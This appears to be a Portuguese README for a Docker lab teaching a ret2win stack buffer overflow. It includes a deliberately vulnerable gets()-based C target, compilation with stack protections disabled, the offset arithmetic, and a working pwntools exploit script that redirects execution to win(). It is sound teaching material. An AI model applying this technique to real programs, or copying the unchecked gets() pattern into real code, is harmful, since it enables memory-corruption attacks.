# Laboratório Pwn: Buffer Overflow (Ret2Win)

Este repositório contém um ambiente isolado em Docker e um exemplo clássico de exploração de binários (Pwn) focado em **Buffer Overflow**. O objetivo é explorar uma vulnerabilidade na função `gets()` para sobrescrever o endereço de retorno e redirecionar o fluxo de execução para uma função restrita (`win()`).

## 🗂️ Estrutura dos Arquivos

- `vulneravel.c`: Código-fonte em C contendo a vulnerabilidade.
- `exploit.py`: Script desenvolvido com a biblioteca `pwntools` para automatizar a exploração.
- `Dockerfile`: Imagem baseada no Ubuntu 22.04 já configurada com as principais ferramentas de Pwn (`radare2`, `pwndbg` e `pwntools`).
- `docker-compose.yml`: Orquestração do contêiner. Note a diretiva `seccomp: unconfined`, essencial para permitir o uso de debuggers (como o GDB) dentro do contêiner.

---

## 🚀 Como Configurar e Executar o Ambiente

Como estamos lidando com exploração de memória e arquitetura, é altamente recomendado rodar tudo dentro do contêiner Docker fornecido para garantir que os endereços e comportamentos sejam consistentes.

### 1. Subindo o Contêiner

No terminal da sua máquina host (onde está o `docker-compose.yml`), execute:

```bash
# Constrói e sobe o contêiner em segundo plano
docker compose up -d

# Entra no shell do contêiner
docker exec -it ctf-box /bin/bash
```

### 2. Compilando o Binário Vulnerável
Dentro do contêiner, vá para a pasta /workspace (que está espelhada com sua máquina host) e compile o código C.

Para que este exploit básico funcione, precisamos desativar as proteções modernas do compilador (como Stack Canary e PIE):

```Bash
cd /workspace
gcc -fno-stack-protector -no-pie vulneravel.c -o vulneravel
```
### 3. Executando o Exploit
Com o binário compilado, basta rodar o script em Python:

```Bash
python3 exploit.py
```
Resultado esperado: Você deverá ver a mensagem [+] SUCESSO! Você sequestrou o fluxo de execução e chamou a função win()! em vez da finalização normal do programa.

## 🧠 Entendendo o Ataque (Análise da Vulnerabilidade)
O Problema no Código C
A função funcao_vulneravel() reserva 64 bytes de memória para a variável buffer. No entanto, ela utiliza a função gets(buffer). A função gets() é famosa por não verificar o limite de tamanho do que o usuário digita. Se o usuário digitar mais de 64 bytes, os dados vazarão para outras áreas da pilha (Stack), causando um Buffer Overflow.

A Matemática do Overflow (Offset)
Para sequestrar a execução, precisamos sobrescrever o RIP (Instruction Pointer - o registrador que diz qual é a próxima instrução a ser executada). Na arquitetura 64 bits, a pilha está organizada da seguinte forma:

Buffer: 64 bytes

Saved RBP (Base Pointer): 8 bytes

RIP (Endereço de Retorno): 8 bytes

Portanto, precisamos de 64 + 8 = 72 bytes de lixo para encher o buffer e o RBP. Tudo o que escrevermos após esses 72 bytes substituirá o RIP.

O Script de Exploração (exploit.py)
O script utiliza o pwntools para facilitar a comunicação e a manipulação de binários:

```Python
# 1. Carrega o binário para extrair informações automaticamente
elf = ELF('./vulneravel')

# 2. Cria o preenchimento (padding) de 72 bytes com a letra "A"
payload = b"A" * 72 

# 3. Anexa o endereço da função 'win' no final do payload.
# A função p64() empacota o endereço em formato little-endian de 64 bits.
payload += p64(elf.symbols['win'])

# 4. Inicia o processo, aguarda a mensagem de input e envia a carga maliciosa
p = process('./vulneravel')
p.recvuntil(b"entrada: ")
p.sendline(payload)

# 5. Imprime o resultado
print(p.recvall().decode())
```
Ao enviar esse payload, a função funcao_vulneravel() termina e tenta "retornar" para onde foi chamada (a main). Porém, como sobrescrevemos o endereço de retorno com o endereço da win(), o processador salta para lá, executando o código restrito.